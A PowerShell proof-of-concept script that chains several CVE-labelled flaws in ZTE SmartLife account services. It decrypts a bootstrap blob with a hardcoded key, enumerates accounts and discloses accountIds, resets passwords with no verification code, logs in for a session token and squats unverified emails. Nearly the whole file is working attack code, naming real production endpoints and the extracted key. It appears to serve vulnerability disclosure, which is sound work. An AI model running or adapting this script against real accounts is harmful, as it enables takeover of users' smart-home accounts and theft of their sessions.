#Requires -Version 7.0
<#
.SYNOPSIS
    SmartLife Account Takeover & Lifecycle PoC
.DESCRIPTION
    Demonstrates the SmartLife account vulnerability chain:
    1. Decrypt unauthenticated UAC bootstrap blob using hardcoded AES-GCM key (CVE-2026-86555).
    2. Account existence enumeration and accountId disclosure via /account/verify.serv (CVE-2026-86554).
    3. Password reset without verification code or old password via /account/password/reset.serv (CVE-2026-86553).
    4. Authenticate with new password via /auth/login.serv, obtaining valid session token.
    5. Demonstrate account squatting / pre-registration via /account/person/signup.serv (CVE-2026-86552).
#>

param(
    [string]$OutDir = (Join-Path $PSScriptRoot 'out'),
    [string]$ClientId = '271950143414',
    [string]$AppDistrict = 'DE',
    [string]$LoginClientIp = '127.0.0.1',
    [switch]$PauseBetweenSteps
)

$ErrorActionPreference = 'Stop'
Set-StrictMode -Version Latest

# Public bootstrap endpoint and static APK decryption key (CVE-2026-86555)
$BootstrapUrl = "https://ossx-smart.ztehome.com.cn:5443/api/getUacSignInfo?clientid=$ClientId"
$BootstrapKey = '096760a7a99d99d12de9fecbfca568c0'
$CountryCode = '0054'

New-Item -ItemType Directory -Force -Path $OutDir | Out-Null

function Write-Section {
    param([string]$Title)
    Write-Host ''
    Write-Host "== $Title ==" -ForegroundColor Cyan
}

function Write-Step {
    param([string]$Text)
    Write-Host ''
    Write-Host "[*] $Text" -ForegroundColor Yellow
}

function Write-KV {
    param([string]$Key, [AllowNull()]$Value)
    Write-Host ("{0,-24}= {1}" -f $Key, $Value)
}

function Wait-IfRequested {
    if ($PauseBetweenSteps) {
        Write-Host ''
        Read-Host 'Press Enter to continue' | Out-Null
    }
}

function ConvertTo-Base64([byte[]]$Bytes) {
    [Convert]::ToBase64String($Bytes)
}

function ConvertFrom-Base64([string]$Text) {
    [Convert]::FromBase64String($Text)
}

function Get-Utf8Bytes([string]$Text) {
    [System.Text.Encoding]::UTF8.GetBytes($Text)
}

function New-RandomString {
    param([int]$Length = 12)
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    -join (1..$Length | ForEach-Object { $chars[(Get-Random -Minimum 0 -Maximum $chars.Length)] })
}

function Invoke-AesGcmEncrypt {
    param(
        [Parameter(Mandatory = $true)][string]$Plaintext,
        [Parameter(Mandatory = $true)][string]$KeyText
    )

    $key = Get-Utf8Bytes $KeyText
    $nonce = New-Object byte[] 12
    [System.Security.Cryptography.RandomNumberGenerator]::Fill($nonce)
    $plain = Get-Utf8Bytes $Plaintext
    $cipher = New-Object byte[] $plain.Length
    $tag = New-Object byte[] 16
    $aes = [System.Security.Cryptography.AesGcm]::new($key, 16)
    try {
        $aes.Encrypt($nonce, $plain, $cipher, $tag)
    } finally {
        $aes.Dispose()
    }

    $combined = New-Object byte[] ($nonce.Length + $cipher.Length + $tag.Length)
    [Array]::Copy($nonce, 0, $combined, 0, $nonce.Length)
    [Array]::Copy($cipher, 0, $combined, $nonce.Length, $cipher.Length)
    [Array]::Copy($tag, 0, $combined, $nonce.Length + $cipher.Length, $tag.Length)
    ConvertTo-Base64 $combined
}

function Invoke-AesGcmDecrypt {
    param(
        [Parameter(Mandatory = $true)][string]$CiphertextBase64,
        [Parameter(Mandatory = $true)][string]$KeyText
    )

    $all = ConvertFrom-Base64 $CiphertextBase64
    if ($all.Length -lt 28) {
        throw 'Ciphertext too short for AES-GCM nonce+ciphertext+tag.'
    }

    $nonce = $all[0..11]
    $cipher = $all[12..($all.Length - 17)]
    $tag = $all[($all.Length - 16)..($all.Length - 1)]
    $plain = New-Object byte[] $cipher.Length
    $key = Get-Utf8Bytes $KeyText
    $aes = [System.Security.Cryptography.AesGcm]::new($key, 16)
    try {
        $aes.Decrypt($nonce, $cipher, $tag, $plain)
    } finally {
        $aes.Dispose()
    }

    [System.Text.Encoding]::UTF8.GetString($plain)
}

function Get-Sha256Hex([string]$Text) {
    $sha = [System.Security.Cryptography.SHA256]::Create()
    try {
        -join ($sha.ComputeHash((Get-Utf8Bytes $Text)) | ForEach-Object { $_.ToString('x2') })
    } finally {
        $sha.Dispose()
    }
}

function Get-ReasonText {
    param([AllowNull()]$Json)
    if ($null -eq $Json) { return '<no-json>' }
    if ($Json.PSObject.Properties.Name -contains 'reason' -and $null -ne $Json.reason) {
        if ($Json.reason.PSObject.Properties.Name -contains 'en_US') { return [string]$Json.reason.en_US }
        return ($Json.reason | ConvertTo-Json -Compress)
    }
    if ($Json.PSObject.Properties.Name -contains 'message' -and $null -ne $Json.message) { return [string]$Json.message }
    return '<no-reason>'
}

function Invoke-JsonPost {
    param(
        [Parameter(Mandatory = $true)][string]$Name,
        [Parameter(Mandatory = $true)][string]$Url,
        [Parameter(Mandatory = $true)][hashtable]$Headers,
        [Parameter(Mandatory = $true)]$Body
    )

    $jsonBody = if ($Body -is [string]) { $Body } else { $Body | ConvertTo-Json -Depth 20 -Compress }
    $started = Get-Date
    try {
        $resp = Invoke-WebRequest -Method Post -Uri $Url -Headers $Headers -ContentType 'application/json' -Body $jsonBody -UseBasicParsing
        $content = [string]$resp.Content
        $json = try { $content | ConvertFrom-Json -Depth 100 } catch { $null }
        [pscustomobject]@{
            name = $Name
            request = [ordered]@{ method = 'POST'; url = $Url; body = $Body }
            status = [int]$resp.StatusCode
            text = $content
            json = $json
            started = $started.ToString('o')
            finished = (Get-Date).ToString('o')
        }
    } catch {
        if (-not $_.Exception.Response) { throw }
        $reader = [System.IO.StreamReader]::new($_.Exception.Response.GetResponseStream())
        try { $content = $reader.ReadToEnd() } finally { $reader.Dispose() }
        $json = try { $content | ConvertFrom-Json -Depth 100 } catch { $null }
        [pscustomobject]@{
            name = $Name
            request = [ordered]@{ method = 'POST'; url = $Url; body = $Body }
            status = [int]$_.Exception.Response.StatusCode
            text = $content
            json = $json
            started = $started.ToString('o')
            finished = (Get-Date).ToString('o')
        }
    }
}

function Show-Result {
    param(
        [string]$Label,
        [object]$Response,
        [string]$ExpectedCode = ''
    )

    $code = if ($null -ne $Response.json -and ($Response.json.PSObject.Properties.Name -contains 'code')) { [string]$Response.json.code } else { '<none>' }
    $reason = Get-ReasonText $Response.json
    $statusText = "http=$($Response.status) code=$code reason=`"$reason`""
    if ($ExpectedCode -and $code -eq $ExpectedCode) {
        Write-Host ("[OK] {0,-28} {1}" -f $Label, $statusText) -ForegroundColor Green
    } elseif ($ExpectedCode) {
        Write-Host ("[!!] {0,-28} {1} expected=$ExpectedCode" -f $Label, $statusText) -ForegroundColor Red
    } else {
        Write-Host ("[--] {0,-28} {1}" -f $Label, $statusText) -ForegroundColor White
    }
}

function Get-AppHeaders {
    param([Parameter(Mandatory = $true)]$Uac)

    $currentTimeMillis = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
    $authMaterial = "{0},{1},{2},{3}" -f $Uac.appUacSec, $Uac.appUacId, $Uac.appUacItp, $currentTimeMillis
    $authValue = Invoke-AesGcmEncrypt -Plaintext $authMaterial -KeyText $Uac.appClientKey
    @{
        'X-Auth-Value' = $authValue
        'X-Tenant-Id'  = $Uac.appUacTenant
        'X-App-Id'     = $Uac.appUacId
        'X-Itp-Value'  = "accessKey=$($Uac.appUacItp)"
        'X-Lang-Id'    = 'en_US'
        'Connection'   = 'close'
    }
}

function Invoke-VerifyEmail {
    param([string]$Email)
    Invoke-JsonPost -Name 'verify-email' -Url "$Base/account/verify.serv" -Headers (Get-AppHeaders -Uac $script:Uac) -Body @{
        key = (Invoke-AesGcmEncrypt -Plaintext $Email -KeyText $script:Uac.appClientKey)
    }
}

function Invoke-Signup {
    param([string]$Email, [string]$Password)
    Invoke-JsonPost -Name 'signup' -Url "$Base/account/person/signup.serv" -Headers (Get-AppHeaders -Uac $script:Uac) -Body @{
        email = $Email
        password = $Password
        country = $CountryCode
    }
}

function Invoke-ResetWithoutCode {
    param([string]$AccountId, [string]$NewPassword)
    Invoke-JsonPost -Name 'reset-without-code' -Url "$Base/account/password/reset.serv" -Headers (Get-AppHeaders -Uac $script:Uac) -Body @{
        accountId = $AccountId
        newPassword = $NewPassword
    }
}

function Invoke-Login {
    param([string]$Email, [string]$Password)

    $encEmail = Invoke-AesGcmEncrypt -Plaintext $Email -KeyText $script:Uac.appClientKey
    $encPass = Invoke-AesGcmEncrypt -Plaintext $Password -KeyText $script:Uac.appClientKey
    $verifyCode = Get-Sha256Hex ($encEmail + $encPass + "${LoginClientIp}${ClientId}")
    Invoke-JsonPost -Name 'login' -Url "$Base/auth/login.serv" -Headers (Get-AppHeaders -Uac $script:Uac) -Body @{
        loginName = $encEmail
        passWord = $encPass
        loginSystemCode = $ClientId
        loginClientIp = $LoginClientIp
        verifyCode = $verifyCode
    }
}

# --- Execution ---
$runId = Get-Date -Format 'yyyyMMdd-HHmmss'
$primaryEmail = "poc-test-$runId@example.com"
$squatEmail = "poc-squat-$runId@example.com"
$primaryPassword = "Aa!$(New-RandomString -Length 12)"
$resetPassword = "Rr!$(New-RandomString -Length 12)"
$squatPassword = "Ss!$(New-RandomString -Length 12)"

Write-Section 'ZTE SmartLife Account Lifecycle PoC'
Write-KV 'run_id' $runId
Write-KV 'bootstrap_url' $BootstrapUrl
Write-KV 'client_id' $ClientId
Write-KV 'target_email' $primaryEmail
Wait-IfRequested

# Step 1: Bootstrap Decrypt
Write-Section '[1] Bootstrap decrypt -> app-auth material (CVE-2026-86555)'
Write-Step 'POST /api/getUacSignInfo; decrypt result.data'
$bootstrap = Invoke-JsonPost -Name 'bootstrap' -Url $BootstrapUrl -Headers @{ Connection = 'close' } -Body @{
    clientid = $ClientId
    appDistrict = $AppDistrict
}
if (-not $bootstrap.json.result.data) { throw 'Bootstrap response did not contain result.data.' }
Show-Result -Label 'public bootstrap' -Response $bootstrap -ExpectedCode ''

$script:Uac = Invoke-AesGcmDecrypt -CiphertextBase64 $bootstrap.json.result.data -KeyText $BootstrapKey | ConvertFrom-Json
$script:Base = "$($script:Uac.appUacUrl)/zte-sec-uac-iportalbff/external"

Write-KV 'appUacUrl' $script:Uac.appUacUrl
Write-KV 'appClientKey' $script:Uac.appClientKey
Write-KV 'appUacId' $script:Uac.appUacId
Write-KV 'appUacTenant' $script:Uac.appUacTenant
Write-KV 'appUacItp' $script:Uac.appUacItp
Wait-IfRequested

# Step 2: Verification oracle & Signup
Write-Section '[2] Account verification oracle (CVE-2026-86554) & Signup'
Write-Step 'verify before signup (expected code 0004: not found)'
$v1 = Invoke-VerifyEmail -Email $primaryEmail
Show-Result -Label 'verify before signup' -Response $v1 -ExpectedCode '0004'

Write-Step 'create proof account'
$signup = Invoke-Signup -Email $primaryEmail -Password $primaryPassword
Show-Result -Label 'signup proof account' -Response $signup -ExpectedCode '0000'
$accountId = [string]$signup.json.data.accountId
Write-KV 'accountId' $accountId

Write-Step 'verify after signup (expected code 0000 + accountId disclosure)'
$v2 = Invoke-VerifyEmail -Email $primaryEmail
Show-Result -Label 'verify after signup' -Response $v2 -ExpectedCode '0000'
Wait-IfRequested

# Step 3: Password reset without code
Write-Section '[3] Password reset without verification code (CVE-2026-86553)'
Write-Step "reset password for accountId $accountId without code"
$reset = Invoke-ResetWithoutCode -AccountId $accountId -NewPassword $resetPassword
Show-Result -Label 'reset without code' -Response $reset -ExpectedCode '0000'

Write-Step 'login with old password (expected rejection code 1002)'
$loginOld = Invoke-Login -Email $primaryEmail -Password $primaryPassword
Show-Result -Label 'login old password' -Response $loginOld -ExpectedCode '1002'

Write-Step 'login with reset password (expected success code 0000)'
$loginNew = Invoke-Login -Email $primaryEmail -Password $resetPassword
Show-Result -Label 'login new password' -Response $loginNew -ExpectedCode '0000'
Write-KV 'token' ([string]$loginNew.json.data.token)
Wait-IfRequested

# Step 4: Account Squatting
Write-Section '[4] Email pre-registration / account squatting (CVE-2026-86552)'
Write-Step 'signup unverified email without mailbox ownership'
$squat = Invoke-Signup -Email $squatEmail -Password $squatPassword
Show-Result -Label 'squat signup' -Response $squat -ExpectedCode '0000'

Write-Step 'login immediately to squatted identity'
$squatLogin = Invoke-Login -Email $squatEmail -Password $squatPassword
Show-Result -Label 'squat login' -Response $squatLogin -ExpectedCode '0000'

Write-Host ''
Write-Host '[+] PoC execution completed.' -ForegroundColor Green
